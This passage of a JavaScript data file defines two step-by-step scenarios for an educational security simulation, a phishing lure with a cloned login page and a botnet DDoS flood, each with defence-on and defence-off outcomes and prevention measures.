        from: 'fakeWebsite',
        to: 'credShield',
        label: 'Credential Submission',
        type: 'conditional',
        desc: 'Submission of simulated credentials to protection layer'
      }
    ],

    steps: [
      {
        stepNumber: 1,
        title: 'Attacker dispatches spoofed email lure',
        activeNode: 'attacker',
        activeConnection: 'c1',
        description:
          'The attacker sends a forged message appearing to come from "IT Support <support@your-c0mpany.co>" claiming the user’s account will be suspended unless re-verified.',
        defenseExplanation:
          'Phishing relies on manufactured urgency, fear, or authority to bypass critical human judgment.',
        statusText: 'Deceptive email sent across internet',
        nodeStatus: { attacker: 'active', emailGateway: 'normal', employeeInbox: 'normal', fakeWebsite: 'normal', credShield: 'normal' }
      },
      {
        stepNumber: 2,
        title: 'Email inspection at secure gateway',
        activeNode: 'emailGateway',
        activeConnection: 'c1',
        description:
          'The email reaches the corporate mail server and undergoes sender verification.',
        defenseExplanation:
          'With Defense ON: SPF/DKIM verification fails because the sending IP is not authorized for the legitimate domain. The gateway tags the subject line with `[SUSPICIOUS / EXTERNAL SENDER]` or drops it into quarantine.\nWith Defense OFF: Without email authentication checks, the spoofed message arrives cleanly in the main inbox.',
        statusText: 'Checking sender domain reputation & DMARC',
        nodeStatus: { attacker: 'normal', emailGateway: 'active', employeeInbox: 'normal', fakeWebsite: 'normal', credShield: 'normal' }
      },
      {
        stepNumber: 3,
        title: 'Employee inspects link and domain',
        activeNode: 'employeeInbox',
        activeConnection: 'c3',
        description:
          'The employee opens the email. The message urges them to click `http://corp-login-verify.net/auth`.',
        defenseExplanation:
          'With Defense ON: Link-protection filters and security awareness training alert the user that the domain does not match their real company portal.\nWith Defense OFF: The user clicks the link without noticing the slightly misspelled domain name.',
        statusText: 'User evaluating sender address and link',
        nodeStatus: { attacker: 'normal', emailGateway: 'normal', employeeInbox: 'active', fakeWebsite: 'normal', credShield: 'normal' }
      },
      {
        stepNumber: 4,
        title: 'Browser encounters cloned login portal',
        activeNode: 'fakeWebsite',
        activeConnection: 'c3',
        description:
          'The browser opens the cloned webpage which looks visually identical to the legitimate company login screen.',
        defenseExplanation:
          'With Defense ON: AdaptiveShield browser heuristics and reputation blacklists flag the domain as newly registered / phishing and display a prominent red "Deceptive Website Blocked" interstitial.\nWith Defense OFF: The page renders normally and prompts for corporate login credentials.',
        statusText: 'Navigating to external domain',
        nodeStatus: { attacker: 'normal', emailGateway: 'normal', employeeInbox: 'normal', fakeWebsite: 'active', credShield: 'normal' }
      },
      {
        stepNumber: 5,
        title: 'Credential submission protection (Simulated credentials only)',
        activeNode: 'credShield',
        activeConnection: 'c4',
        description:
          'The user attempts to enter simulated credentials (`user: demo@corp, pass: ••••••••`).',
        defenseExplanation:
          'With Defense ON: Hardware-backed FIDO2 WebAuthn keys cryptographically refuse to sign authentication requests on unauthorized domains. Password managers also refuse to auto-fill. Zero credentials are submitted!\nWith Defense OFF: Simulated credentials are sent in plaintext directly to the attacker’s database.',
        statusText: 'Credential submission evaluated safely',
        nodeStatus: { attacker: 'normal', emailGateway: 'normal', employeeInbox: 'normal', fakeWebsite: 'normal', credShield: 'active' }
      }
    ],

    whatDidWeLearn: {
      attempted: 'The attacker attempted to trick an employee into revealing their corporate account credentials via a cloned website.',
      stoppedBy: 'Email authentication (SPF/DKIM/DMARC), domain reputation filtering, and FIDO2 WebAuthn cryptographic binding.',
      assetProtected: 'Employee user identity, corporate network access tokens, and private internal accounts.',
      defenseDisabledOutcome: 'The attacker would have harvested the credentials and logged into internal systems undetected.',
      preventionMeasures: [
        'Enforce FIDO2 WebAuthn hardware security keys: unlike SMS or authenticator codes, FIDO2 binds authentication directly to the true browser URL, making credential phishing technically impossible.',
        'Implement strict DMARC, DKIM, and SPF email policies to reject spoofed sender addresses.',
        'SIMULATION SAFETY NOTICE: Never enter real passwords into educational demonstrations. Always verify the domain in your browser’s address bar before logging into any account.'
      ],
      engineDistinction: 'Educational Simulation Note: This simulation illustrates human social engineering and domain spoofing. In the AdaptiveShield extension and C++ engine, real-time URL inspection checks domain reputation.'
    }
  },

  ddos: {
    id: 'ddos',
    title: 'Distributed Denial of Service (DDoS)',
    shortName: 'DDoS Flood',
    severity: 'CRITICAL',
    icon: Flame,
    category: 'Volumetric & Resource Exhaustion',

    whatIsThis: {
      summary:
        'A Distributed Denial of Service (DDoS) attack uses a distributed network of compromised devices (a botnet) to overwhelm a target server with massive volumes of traffic, rendering it unavailable to real users.',
      example:
        'Thousands of compromised routers and servers send 50,000 HTTP requests per second to a retail website on Black Friday.',
      impact:
        'The web server’s CPU, memory, and worker threads reach 100% capacity, causing legitimate customer connections to time out with HTTP 503 Service Unavailable errors.'
    },

    nodes: [
      {
        id: 'bot1',
        label: 'Botnet Node 1 (IoT)',
        role: 'Compromised Camera',
        icon: Bot,
        type: 'attacker',
        x: 10,
        y: 16,
        desc: 'Compromised IoT camera blasting volumetric SYN packets'
      },
      {
        id: 'bot2',
        label: 'Botnet Node 2 (Router)',
        role: 'Infected Gateway',
        icon: Bot,
        type: 'attacker',
        x: 10,
        y: 38,
        desc: 'Infected home router flooding target IP with UDP packets'
      },
      {
        id: 'bot3',
        label: 'Botnet Node 3 (Zombie)',
        role: 'Compromised Server',
        icon: Bot,
        type: 'attacker',
        x: 10,
        y: 60,
        desc: 'Compromised cloud instance blasting HTTP GET requests'
      },
      {
        id: 'legitUsers',
        label: 'Legitimate Visitors',
        role: 'Real Customer',
        icon: User,
        type: 'client',
        x: 10,
        y: 82,
        desc: 'Actual customers attempting to view products and make purchases'
      },
      {
        id: 'internetGateway',
        label: 'Internet Ingress Gateway',
        role: 'Network Backbone',
        icon: Network,
        type: 'network',
        x: 40,
        y: 50,
        desc: 'Public transit network routing packet streams toward the datacenter'
      },
      {
        id: 'rateLimiter',
        label: 'AdaptiveShield Rate Limiter',
        role: 'Traffic Filtering Engine',
        icon: Shield,
        type: 'security',
        x: 67,
        y: 50,
        desc: 'Stage 3 Sliding-Window Rate Limiter & Stage 5 Reputation Auto-Ban'
      },
      {
        id: 'webServer',
        label: 'Target Web Server',
        role: 'Origin Server',
        icon: Server,
        type: 'server',
        x: 90,
        y: 50,
        desc: 'Production web application server with finite CPU and worker thread pool'
      }
    ],

    connections: [
      {
        id: 'c1',
        from: 'bot1',
        to: 'internetGateway',
        label: 'SYN Flood',
        type: 'malicious',
        desc: 'Surge of 15,000 SYN packets flooding network ingress'
      },
      {
        id: 'c2',
        from: 'bot2',
        to: 'internetGateway',
        label: 'UDP Flood',
        type: 'malicious',
        desc: 'Volumetric UDP reflection flood packets'
      },
      {
        id: 'c3',
        from: 'bot3',
        to: 'internetGateway',
        label: 'HTTP Surge',
        type: 'malicious',
        desc: 'Repetitive HTTP GET requests attempting worker pool exhaustion'
      },
      {
        id: 'c4',
        from: 'legitUsers',
        to: 'internetGateway',
        label: 'GET /store',
        type: 'normal',
        desc: 'Normal customer browsing traffic (1 request every few seconds)'
      },
      {
        id: 'c5',
        from: 'internetGateway',
        to: 'rateLimiter',
        label: 'Aggregated Ingress',
        type: 'warning',
        desc: 'Combined traffic stream entering perimeter inspection zone'
      },
      {
        id: 'c6',
        from: 'rateLimiter',
        to: 'webServer',
        label: 'Scrubbed Stream',
        type: 'conditional',
        desc: 'Scrubbed traffic passed to origin web server'
      }
    ],

    steps: [
      {
        stepNumber: 1,
        title: 'Botnet army coordinates multi-node flood surge',
        activeNode: 'bot1',
        activeConnection: 'c1',
        description:
          'Multiple attacker bot devices (Bot 1, Bot 2, Bot 3) coordinate a simultaneous packet surge toward the target web server. Meanwhile, genuine users are also attempting to access the site.',
        defenseExplanation:
          'Legitimate users browse at normal request rates. The defense must distinguish malicious flood traffic from genuine customer requests.',
        statusText: 'Botnet surge coordinated by attacker C2',
        nodeStatus: { bot1: 'active', bot2: 'active', bot3: 'active', legitUsers: 'normal', internetGateway: 'normal', rateLimiter: 'normal', webServer: 'normal' }
      },
      {
        stepNumber: 2,
        title: 'Massive volumetric surge reaches internet gateway',
        activeNode: 'internetGateway',
        activeConnection: 'c5',
        description:
          'Traffic surges exponentially. Thousands of SYN, UDP, and HTTP requests converge at the Internet Ingress Gateway and head into the firewall inspection zone.',
        defenseExplanation:
          'Network buffers begin to fill. Unprotected infrastructure without traffic filtering quickly suffers severe packet drops.',
        statusText: 'Ingress traffic surge entering network',
        nodeStatus: { bot1: 'normal', bot2: 'normal', bot3: 'normal', legitUsers: 'normal', internetGateway: 'active', rateLimiter: 'normal', webServer: 'normal' }
      },
      {
        stepNumber: 3,
        title: 'AdaptiveShield rate limiting and anomaly inspection',
        activeNode: 'rateLimiter',
        activeConnection: 'c5',
        description:
          'Packets reach AdaptiveShield Stage 3 (Sliding-Window Rate Limiter) and Stage 5 (Adaptive Auto-Block).',
        defenseExplanation:
          'With Defense ON: AdaptiveShield tracks request frequencies per IP within a 4,000ms sliding window. IPs exceeding 8 req/window are immediately flagged and throttled.\nWith Defense OFF: All requests pass directly to the origin web server unrestricted.',
        statusText: 'Per-IP request frequencies being tracked',
        nodeStatus: { bot1: 'normal', bot2: 'normal', bot3: 'normal', legitUsers: 'normal', internetGateway: 'normal', rateLimiter: 'active', webServer: 'normal' }
      },
      {
        stepNumber: 4,
        title: 'Traffic scrubbing: bot traffic blocked, legitimate users passed',
        activeNode: 'rateLimiter',
        activeConnection: 'c6',
        description:
          'The rate limiter drops excessive bot packets into quarantine while forwarding legitimate customer requests.',
        defenseExplanation:
          'With Defense ON: Bot packets turn red and are dropped at the rate limiter. Normal user traffic passes through cleanly.\nWith Defense OFF: The origin server is flooded with 50,000 requests/second, saturating all connection pools.',
        statusText: 'Filtering decisions applied to packet stream',
        nodeStatus: { bot1: 'normal', bot2: 'normal', bot3: 'normal', legitUsers: 'active', internetGateway: 'normal', rateLimiter: 'active', webServer: 'normal' }
      },
      {
        stepNumber: 5,
        title: 'Origin web server health and final status',
        activeNode: 'webServer',
        activeConnection: 'c6',
        description:
          'The web server processes the filtered traffic stream and responds to visitors.',
        defenseExplanation:
          'With Defense ON: Web Server CPU load stays healthy at 18%. Genuine visitors receive crisp 200 OK responses with normal latency.\nWith Defense OFF: Web Server CPU reaches 100%. Worker threads exhaust memory, and users receive HTTP 503 Service Unavailable errors.',
        statusText: 'Server availability evaluated',
        nodeStatus: { bot1: 'normal', bot2: 'normal', bot3: 'normal', legitUsers: 'normal', internetGateway: 'normal', rateLimiter: 'normal', webServer: 'active' }
      }
    ],

    whatDidWeLearn: {
      attempted: 'The botnet attempted to exhaust origin server compute, RAM, and bandwidth resources through high-volume request surges.',
      stoppedBy: 'AdaptiveShield Stage 3 sliding-window rate limiter (8 req/4s) combined with Stage 5 cumulative IP auto-banning.',
      assetProtected: 'Web server uptime, CPU processing capacity, and service availability for paying customers.',
      defenseDisabledOutcome: 'The server suffered an outage, crashing under load and serving HTTP 503 errors to legitimate customers.',
      preventionMeasures: [
        'Deploy multi-tier rate limiting: protect login endpoints, search APIs, and heavy database queries with strict sliding windows.',
        'IMPORTANT: Do not imply that a local rate limiter alone can stop every massive distributed attack. Large volumetric terabit-scale floods require upstream Anycast BGP scrubbing and CDN edge distribution before packets even reach local servers.',
        'Implement SYN cookies and connection timeouts to prevent TCP state exhaustion attacks.'
      ],
      engineDistinction: 'Educational Simulation Note: This simulation illustrates volumetric rate limiting vs server exhaustion. In the actual AdaptiveShield C++ engine, Stage 3 enforces a 4,000ms sliding window and Stage 5 evaluates reputation scores.'
    }
  }
};
